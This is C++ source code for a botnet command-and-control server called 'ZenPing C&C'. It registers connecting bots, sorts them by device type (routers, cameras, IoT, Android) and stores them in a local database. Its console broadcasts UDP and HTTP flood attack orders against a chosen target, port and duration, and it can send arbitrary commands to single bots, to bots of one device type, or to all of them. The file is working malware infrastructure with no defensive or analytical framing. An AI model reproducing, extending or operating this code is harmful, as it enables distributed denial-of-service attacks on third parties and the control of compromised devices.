#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <map>
#include <sstream>
#include <cstring>
#include <fstream>
#include <algorithm>
#include <iomanip>
#include <ctime>
#include <atomic>
#include <unordered_map>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <signal.h>
#endif

class ZenPingCNC {
private:
    int serverSocket;
    std::mutex clientsMutex;
    std::map<int, std::string> clients; // socket -> botId
    std::map<std::string, int> botSockets; // botId -> socket
    std::atomic<bool> running;
    
    struct BotInfo {
        std::string id;
        std::string version;
        std::string hostname;
        std::string ip;
        time_t firstSeen;
        time_t lastSeen;
        std::string type;
        std::string publicIP;
        bool isOnline;
    };
    std::map<std::string, BotInfo> botDatabase;
    std::mutex databaseMutex;
    
    struct AttackStats {
        int totalAttacks;
        int activeAttacks;
        std::map<std::string, int> attackTypes;
    };
    AttackStats stats;
    std::mutex statsMutex;
    
    void closeSocket(int s) {
        if (s >= 0) {
#ifdef _WIN32
            closesocket(s);
#else
            close(s);
#endif
        }
    }
    
    bool authenticateBot(int clientSocket, std::string& botId) {
        char buffer[1024];
        int bytes = recv(clientSocket, buffer, sizeof(buffer)-1, 0);
        if (bytes <= 0) {
            std::cerr << "Failed to receive auth data" << std::endl;
            return false;
        }
        
        buffer[bytes] = '\0';
        std::string authData(buffer, bytes);
        
        if (authData.find("ZENPING_BOT:") == 0) {
            std::vector<std::string> parts;
            std::istringstream ss(authData);
            std::string part;
            
            while (std::getline(ss, part, ':')) {
                parts.push_back(part);
            }
            
            if (parts.size() >= 3) {
                botId = parts[1];
                
                std::string welcome = "WELCOME:" + botId;
                if (send(clientSocket, welcome.c_str(), welcome.length(), 0) <= 0) {
                    std::cerr << "Failed to send welcome" << std::endl;
                    return false;
                }
                
                return true;
            }
        }
        
        std::cerr << "Invalid auth data: " << authData << std::endl;
        return false;
    }
    
    BotInfo createBotInfo(int clientSocket, const std::string& botId, const std::string& clientIp) {
        BotInfo bot;
        bot.id = botId;
        bot.ip = clientIp;
        bot.firstSeen = std::time(nullptr);
        bot.lastSeen = std::time(nullptr);
        bot.isOnline = true;
        
        if (botId.find("ZenPing_") == 0) {
            size_t start = 8;
            size_t end = botId.find('_', start);
            if (end != std::string::npos) {
                bot.hostname = botId.substr(start, end - start);
            } else {
                bot.hostname = "unknown";
            }
        } else {
            bot.hostname = "unknown";
        }
        
        bot.type = detectDeviceType(botId, clientIp);
        bot.version = "1.0";
        
        return bot;
    }
    
    std::string detectDeviceType(const std::string& botId, const std::string& ip) {
        std::string idLower = botId;
        std::transform(idLower.begin(), idLower.end(), idLower.begin(), ::tolower);
        
        if (idLower.find("router") != std::string::npos || 
            idLower.find("gateway") != std::string::npos) {
            return "router";
        }
        else if (idLower.find("android") != std::string::npos) {
            return "android";
        }
        else if (idLower.find("camera") != std::string::npos) {
            return "camera";
        }
        else if (idLower.find("iot") != std::string::npos) {
            return "iot";
        }
        else if (idLower.find("server") != std::string::npos) {
            return "server";
        }
        else if (ip.find("192.168.") == 0 || ip.find("10.") == 0 || ip.find("172.") == 0) {
            return "internal";
        }
        else {
            return "desktop";
        }
    }
    
    void handleBot(int clientSocket, const std::string& clientIp) {
        std::string botId;
        if (!authenticateBot(clientSocket, botId)) {
            closeSocket(clientSocket);
            return;
        }
        
        BotInfo bot = createBotInfo(clientSocket, botId, clientIp);
        
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients[clientSocket] = botId;
            botSockets[botId] = clientSocket;
        }
        
        {
            std::lock_guard<std::mutex> lock(databaseMutex);
            botDatabase[botId] = bot;
        }
        
        std::cout << "[+] ZenPing Bot connected: " << botId << " [" << bot.type << "] from " << clientIp << std::endl;
        std::cout << "[*] Online bots: " << clients.size() << std::endl;
        
        char buffer[4096];
        
        while (running) {
            int bytes = recv(clientSocket, buffer, sizeof(buffer)-1, 0);
            if (bytes <= 0) {
                break;
            }
            
            buffer[bytes] = '\0';
            std::string message(buffer, bytes);
            
            processBotMessage(botId, message);
            
            updateBotLastSeen(botId);
        }
        
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients.erase(clientSocket);
            botSockets.erase(botId);
        }
        
        {
            std::lock_guard<std::mutex> lock(databaseMutex);
            auto it = botDatabase.find(botId);
            if (it != botDatabase.end()) {
                it->second.isOnline = false;
            }
        }
        
        closeSocket(clientSocket);
        std::cout << "[-] ZenPing Bot disconnected: " << botId << std::endl;
    }
    
    void processBotMessage(const std::string& botId, const std::string& message) {
        if (message.find("PONG:") == 0) {
            updateBotLastSeen(botId);
            std::cout << "[*] Heartbeat from " << botId << std::endl;
        }
        else if (message.find("INFO:") == 0) {
            updateBotInfo(botId, message);
        }
        else {
            std::cout << "[*] Message from " << botId << ": " << message << std::endl;
        }
    }
    
    void updateBotInfo(const std::string& botId, const std::string& info) {
        std::lock_guard<std::mutex> lock(databaseMutex);
        auto it = botDatabase.find(botId);
        if (it != botDatabase.end()) {
            std::cout << "[*] Updated info for " << botId << std::endl;
        }
    }
    
    void updateBotLastSeen(const std::string& botId) {
        std::lock_guard<std::mutex> lock(databaseMutex);
        auto it = botDatabase.find(botId);
        if (it != botDatabase.end()) {
            it->second.lastSeen = std::time(nullptr);
        }
    }
    
    std::string getClientIp(int clientSocket) {
        struct sockaddr_in addr;
        socklen_t addrLen = sizeof(addr);
        
        if (getpeername(clientSocket, (struct sockaddr*)&addr, &addrLen) == 0) {
            char ipStr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr.sin_addr, ipStr, INET_ADDRSTRLEN);
            return std::string(ipStr);
        }
        return "unknown";
    }
    
    void loadBotDatabase() {
        std::ifstream file("zenping_bots.db");
        if (!file.is_open()) {
            std::cout << "[*] No existing bot database found" << std::endl;
            return;
        }
        
        std::string line;
        int loaded = 0;
        while (std::getline(file, line)) {
            std::vector<std::string> parts;
            std::istringstream ss(line);
            std::string part;
            
            while (std::getline(ss, part, '|')) {
                parts.push_back(part);
            }
            
            if (parts.size() >= 6) {
                BotInfo bot;
                bot.id = parts[0];
                bot.version = parts[1];
                bot.hostname = parts[2];
                bot.ip = parts[3];
                try {
                    bot.firstSeen = std::stol(parts[4]);
                    bot.lastSeen = std::stol(parts[5]);
                } catch (...) {
                    bot.firstSeen = bot.lastSeen = std::time(nullptr);
                }
                if (parts.size() >= 7) {
                    bot.type = parts[6];
                } else {
                    bot.type = "unknown";
                }
                bot.isOnline = false;
                botDatabase[bot.id] = bot;
                loaded++;
            }
        }
        file.close();
        std::cout << "[*] Loaded " << loaded << " bots from database" << std::endl;
    }
    
    void saveBotDatabase() {
        std::lock_guard<std::mutex> lock(databaseMutex);
        std::ofstream file("zenping_bots.db");
        if (!file.is_open()) {
            std::cerr << "[!] Failed to save bot database" << std::endl;
            return;
        }
        
        int saved = 0;
        for (const auto& pair : botDatabase) {
            const BotInfo& bot = pair.second;
            file << bot.id << "|" << bot.version << "|" 
                 << bot.hostname << "|" << bot.ip << "|" 
                 << bot.firstSeen << "|" << bot.lastSeen << "|" 
                 << bot.type << std::endl;
            saved++;
        }
        file.close();
        std::cout << "[*] Saved " << saved << " bots to database" << std::endl;
    }
    
    void showBotStats() {
        std::lock_guard<std::mutex> lock(databaseMutex);
        
        int totalBots = botDatabase.size();
        int onlineBots = 0;
        std::map<std::string, int> typeCount;
        
        for (const auto& pair : botDatabase) {
            if (pair.second.isOnline) onlineBots++;
            typeCount[pair.second.type]++;
        }
        
        std::cout << "\n=== ZenPing Bot Statistics ===" << std::endl;
        std::cout << "Total Bots: " << totalBots << std::endl;
        std::cout << "Online Bots: " << onlineBots << std::endl;
        std::cout << "Offline Bots: " << (totalBots - onlineBots) << std::endl;
        
        std::cout << "\n=== By Device Type ===" << std::endl;
        for (const auto& type : typeCount) {
            std::cout << std::left << std::setw(15) << type.first 
                      << ": " << type.second << std::endl;
        }
    }
    
    void showOnlineBots() {
        std::lock_guard<std::mutex> lock(databaseMutex);
        
        std::cout << "\n=== Online ZenPing Bots ===" << std::endl;
        std::cout << std::left << std::setw(25) << "ID" 
                  << std::setw(15) << "Type"
                  << std::setw(18) << "IP" 
                  << std::setw(12) << "Uptime" << std::endl;
        std::cout << std::string(70, '-') << std::endl;
        
        time_t now = std::time(nullptr);
        for (const auto& pair : botDatabase) {
            if (pair.second.isOnline) {
                const BotInfo& bot = pair.second;
                time_t uptime = now - bot.firstSeen;
                int hours = uptime / 3600;
                int minutes = (uptime % 3600) / 60;
                
                std::cout << std::left << std::setw(25) 
                          << (bot.id.length() > 24 ? bot.id.substr(0, 24) : bot.id)
                          << std::setw(15) << bot.type
                          << std::setw(18) << bot.ip
                          << std::setw(12) << (std::to_string(hours) + "h" + std::to_string(minutes) + "m")
                          << std::endl;
            }
        }
    }
    
    void sendToBot(const std::string& botId, const std::string& command) {
        std::lock_guard<std::mutex> lock(clientsMutex);
        auto it = botSockets.find(botId);
        if (it != botSockets.end()) {
            if (send(it->second, command.c_str(), command.length(), 0) > 0) {
                std::cout << "[*] Command sent to " << botId << std::endl;
            } else {
                std::cout << "[!] Failed to send to " << botId << std::endl;
            }
        } else {
            std::cout << "[!] Bot not found or offline: " << botId << std::endl;
        }
    }
    
    void sendToType(const std::string& type, const std::string& command) {
        std::lock_guard<std::mutex> lock1(databaseMutex);
        std::lock_guard<std::mutex> lock2(clientsMutex);
        
        int sent = 0;
        for (const auto& pair : botDatabase) {
            if (pair.second.type == type && pair.second.isOnline) {
                auto socketIt = botSockets.find(pair.first);
                if (socketIt != botSockets.end()) {
                    if (send(socketIt->second, command.c_str(), command.length(), 0) > 0) {
                        sent++;
                    }
                }
            }
        }
        std::cout << "[*] Sent to " << sent << " " << type << " devices" << std::endl;
    }
    
    void broadcastCommand(const std::string& command) {
        std::lock_guard<std::mutex> lock(clientsMutex);
        int sent = 0;
        int total = clients.size();
        
        for (const auto& client : clients) {
            if (send(client.first, command.c_str(), command.length(), 0) > 0) {
                sent++;
            }
        }
        std::cout << "[*] Command broadcast to " << sent << "/" << total << " bots" << std::endl;
    }
    
    void showAllBots() {
        std::lock_guard<std::mutex> lock(databaseMutex);
        
        std::cout << "\n=== All ZenPing Bots ===" << std::endl;
        std::cout << std::left << std::setw(25) << "ID" 
                  << std::setw(15) << "Type"
                  << std::setw(18) << "IP" 
                  << std::setw(8) << "Status"
                  << std::setw(12) << "Last Seen" << std::endl;
        std::cout << std::string(80, '-') << std::endl;
        
        time_t now = std::time(nullptr);
        for (const auto& pair : botDatabase) {
            const BotInfo& bot = pair.second;
            std::string status = bot.isOnline ? "ONLINE" : "OFFLINE";
            std::string lastSeen = formatTime(now - bot.lastSeen);
            
            std::cout << std::left << std::setw(25) 
                      << (bot.id.length() > 24 ? bot.id.substr(0, 24) : bot.id)
                      << std::setw(15) << bot.type
                      << std::setw(18) << bot.ip
                      << std::setw(8) << status
                      << std::setw(12) << lastSeen
                      << std::endl;
        }
    }
    
    std::string formatTime(time_t seconds) {
        if (seconds < 60) return std::to_string(seconds) + "s";
        else if (seconds < 3600) return std::to_string(seconds/60) + "m";
        else if (seconds < 86400) return std::to_string(seconds/3600) + "h";
        else return std::to_string(seconds/86400) + "d";
    }
    
    void handleAttackCommand(const std::string& attackCmd) {
        std::vector<std::string> args;
        std::istringstream ss(attackCmd);
        std::string arg;
        
        while (ss >> arg) {
            args.push_back(arg);
        }
        
        if (args.size() < 4) {
            std::cout << "[!] Usage: attack TYPE TARGET PORT DURATION [THREADS]" << std::endl;
            std::cout << "[!] Example: attack UDP 192.168.1.1 80 60" << std::endl;
            return;
        }
        
        std::string attackType = args[0];
        std::string target = args[1];
        std::string port = args[2];
        std::string duration = args[3];
        std::string threads = args.size() > 4 ? args[4] : "10";
        
        std::string command;
        if (attackType == "UDP") {
            command = "UDP " + target + " " + port + " " + duration + " 1024";
        }
        else if (attackType == "HTTP") {
            command = "HTTP " + target + " " + duration + " " + threads;
        }
        else {
            std::cout << "[!] Unknown attack type: " << attackType << std::endl;
            return;
        }
        
        broadcastCommand(command);
        std::cout << "[*] ZenPing attack launched: " << attackType << " on " << target << std::endl;
        
        // 更新统计
        {
            std::lock_guard<std::mutex> lock(statsMutex);
            stats.totalAttacks++;
            stats.activeAttacks++;
            stats.attackTypes[attackType]++;
        }
    }

public:
    ZenPingCNC() : serverSocket(-1), running(true) {
        stats.totalAttacks = 0;
        stats.activeAttacks = 0;
        
        loadBotDatabase();
    }
    
    ~ZenPingCNC() {
        running = false;
        closeSocket(serverSocket);
        saveBotDatabase();
        
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    bool start(int port = 5555) {
#ifdef _WIN32
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
            std::cerr << "[!] WSAStartup failed" << std::endl;
            return false;
        }
#endif

        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket < 0) {
            std::cerr << "[!] Socket creation failed" << std::endl;
            return false;
        }
        
        int opt = 1;
#ifdef _WIN32
        if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) < 0) {
            std::cerr << "[!] SO_REUSEADDR failed" << std::endl;
        }
#else
        if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
            std::cerr << "[!] SO_REUSEADDR failed" << std::endl;
        }
#endif
        
        struct sockaddr_in serverAddr;
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
            std::cerr << "[!] Bind failed on port " << port << std::endl;
            closeSocket(serverSocket);
            return false;
        }
        
        if (listen(serverSocket, 1000) < 0) {
            std::cerr << "[!] Listen failed" << std::endl;
            closeSocket(serverSocket);
            return false;
        }
        
        std::cout << "[+] ZenPing C&C Server started on port " << port << std::endl;
        return true;
    }
    
    void runConsole() {
        std::cout << "=== ZenPing C&C Console v1.0 ===" << std::endl;
        std::cout << "Commands:" << std::endl;
        std::cout << "  stats          - 显示统计信息" << std::endl;
        std::cout << "  bots           - 显示在线僵尸" << std::endl;
        std::cout << "  list           - 列出所有僵尸" << std::endl;
        std::cout << "  attack TYPE TARGET PORT DURATION - 攻击命令" << std::endl;
        std::cout << "  send BOT CMD   - 发送命令给特定僵尸" << std::endl;
        std::cout << "  sendtype TYPE CMD - 发送给特定类型" << std::endl;
        std::cout << "  broadcast CMD  - 广播命令" << std::endl;
        std::cout << "  ping           - 心跳检测" << std::endl;
        std::cout << "  quit           - 退出" << std::endl;
        
        std::string input;
        while (running) {
            std::cout << "\nZenPing> ";
            if (!std::getline(std::cin, input)) {
                break;
            }
            
            if (input == "quit" || input == "exit") {
                running = false;
                break;
            }
            else if (input == "stats") {
                showBotStats();
            }
            else if (input == "bots") {
                showOnlineBots();
            }
            else if (input == "list") {
                showAllBots();
            }
            else if (input == "ping") {
                broadcastCommand("PING");
            }
            else if (input.find("send ") == 0) {
                size_t space1 = input.find(' ');
                size_t space2 = input.find(' ', space1 + 1);
                if (space1 != std::string::npos && space2 != std::string::npos) {
                    std::string botId = input.substr(space1 + 1, space2 - space1 - 1);
                    std::string command = input.substr(space2 + 1);
                    sendToBot(botId, command);
                } else {
                    std::cout << "[!] Usage: send BOT_ID COMMAND" << std::endl;
                }
            }
            else if (input.find("sendtype ") == 0) {
                size_t space1 = input.find(' ');
                size_t space2 = input.find(' ', space1 + 1);
                if (space1 != std::string::npos && space2 != std::string::npos) {
                    std::string type = input.substr(space1 + 1, space2 - space1 - 1);
                    std::string command = input.substr(space2 + 1);
                    sendToType(type, command);
                } else {
                    std::cout << "[!] Usage: sendtype TYPE COMMAND" << std::endl;
                }
            }
            else if (input.find("broadcast ") == 0) {
                std::string command = input.substr(10);
                broadcastCommand(command);
            }
            else if (input.find("attack ") == 0) {
                std::string attackCmd = input.substr(7);
                handleAttackCommand(attackCmd);
            }
            else if (!input.empty()) {
                std::cout << "[!] Unknown command: " << input << std::endl;
            }
        }
    }
    
    void run() {
        if (!start()) {
            std::cerr << "[!] Failed to start ZenPing C&C server" << std::endl;
            return;
        }
        
        std::thread consoleThread(&ZenPingCNC::runConsole, this);
        
        while (running) {
            struct sockaddr_in clientAddr;
            socklen_t clientLen = sizeof(clientAddr);
            
            int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientLen);
            if (clientSocket < 0) {
                if (running) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    continue;
                } else {
                    break;
                }
            }
            
            std::string clientIp = getClientIp(clientSocket);
            std::thread(&ZenPingCNC::handleBot, this, clientSocket, clientIp).detach();
        }
        
        if (consoleThread.joinable()) {
            consoleThread.join();
        }
    }
};

#ifdef _WIN32
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        exit(0);
    }
    return TRUE;
}
#else
void signalHandler(int signal) {
    exit(0);
}
#endif

int main() {
#ifdef _WIN32
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    SetConsoleTitleA("ZenPing C&C Server v2.0");
#else
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
#endif

    std::cout << "Initializing ZenPing C&C Server..." << std::endl;
    
    ZenPingCNC cnc;
    cnc.run();
    
    return 0;
}